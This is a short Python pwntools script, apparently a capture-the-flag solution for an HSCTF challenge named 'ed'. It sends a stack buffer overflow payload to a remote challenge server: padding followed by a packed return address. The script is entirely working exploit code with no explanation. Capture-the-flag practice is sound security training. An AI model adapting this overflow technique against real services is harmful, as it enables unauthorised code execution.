from pwn import *

payload = b'Q' 
payload += b"\00"
payload += b"A"*38
payload += p64(0x4011d2)

#p=process("./ed")
p =remote("ed.hsctf.com", 1337)
p.sendline(payload)
print(p.recv())
#flag = p.recvline().decode().strip()
#print("Flag:", flag)

#p.close()
